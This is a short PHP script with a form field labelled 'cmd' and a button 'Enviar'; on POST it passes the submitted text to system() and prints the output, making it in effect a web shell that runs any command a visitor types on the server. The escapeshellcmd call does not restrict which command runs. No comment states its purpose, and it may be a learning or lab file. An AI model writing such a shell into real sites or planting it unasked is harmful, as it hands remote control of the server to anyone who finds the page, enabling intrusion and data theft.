<?php
echo "<pre>";


if($_SERVER["REQUEST_METHOD"] === "POST"){

$cmd = escapeshellcmd($_POST["cmd"]);

var_dump($cmd);

$comando = system($cmd, $retorno);

echo "</pre>";

}
?>

<form method="post">

<input type="text" name="cmd">
<button type="submit">Enviar</button>

</form>